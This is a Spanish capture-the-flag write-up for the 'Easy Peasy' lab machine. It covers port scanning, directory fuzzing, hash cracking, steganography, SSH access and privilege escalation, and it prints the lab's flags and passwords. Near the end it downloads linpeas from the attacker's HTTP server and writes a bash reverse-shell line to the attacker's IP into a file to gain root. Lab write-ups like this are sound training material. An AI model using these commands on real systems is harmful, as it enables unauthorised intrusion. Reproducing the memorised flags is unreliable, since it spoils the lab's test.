# Easy Peasy

## Nmap

![alt text](image.png)

## Puertos abiertos

![alt text](image-10.png)

## Web

Puerto 80

![alt text](image-1.png)

Robots.txt

![alt text](image-2.png)

Versión nginx

![alt text](image-3.png)

Puerto 65524

![alt text](image-11.png)

## Fuzzing

    gobuster dir -u http://10.10.44.195/ -w Desktop/common.txt -x php 

![alt text](image-4.png)

![alt text](image-5.png)

![alt text](image-6.png)

![alt text](image-7.png)

![alt text](image-8.png)

![alt text](image-9.png)

    flag{f1rs7_fl4g}

![alt text](image-12.png)

![alt text](image-13.png)

Para crackear el hash lo introducimos en la siguiente web [md5hashing](https://md5hashing.net/hash/md5)

    flag{1m_s3c0nd_fl4g}

![alt text](image-14.png)

Encontramos la tercera flag en la mísma web de apache

![alt text](image-15.png)

Encontramos un codigo cifrado en base62, hace referencia a la ruta escondida ``/n0th1ng3ls3m4tt3r``

![alt text](image-16.png)

![alt text](image-17.png)

En el código fuente encontramos un hash

![alt text](image-18.png)

Usamos ``hash-identifier``, para ver posibles cifrados

![alt text](image-19.png)

Use los posibles cifrados pero no lo encontré, por lo que use john y el diccionario de contraseñas ``easypeasy.txt``

![alt text](image-20.png)

![alt text](image-21.png)

    mypasswordforthatjob

Descargamos la imagen de la web, comprobamos si tiene algun texto escondido

    steghide extract -sf binarycodepixabay.jpg 

Nos pide una contraseña, usamos la que acabamos de conseguir

![alt text](image-22.png)

![alt text](image-23.png)

	iconvertedmypasswordtobinary

## SSH

    ssh -p 6498 boring@10.10.254.187

![alt text](image-24.png)

Encontramos un ``user.txt`` con la flag ¿rotada?

![alt text](image-26.png)

Usamos [rot13](https://rot13.com/)

    flag{n0wits33msn0rm4l}

![alt text](image-25.png)

## Escalada de privilegios

Iniciamos un servidor para subir ``linpeas``

    python3 -m http.server 1234

![alt text](image-27.png)

Lo descargamos en la máquina atacada

    wget 10.8.67.209:1234/linpeas.sh

![alt text](image-28.png)

Lo ejecutamos

    chmod +x linpeas.sh

    ./linpeas.sh

![alt text](image-29.png)

Creamos una shell en el archivo

    bash -i >& /dev/tcp/10.8.67.209/8080 0>&1

![alt text](image-30.png)

Ponemos el puerto en escucha, ya tendremos acceso ``root``

![alt text](image-31.png)

Buscamos ``root.txt``

![alt text](image-32.png)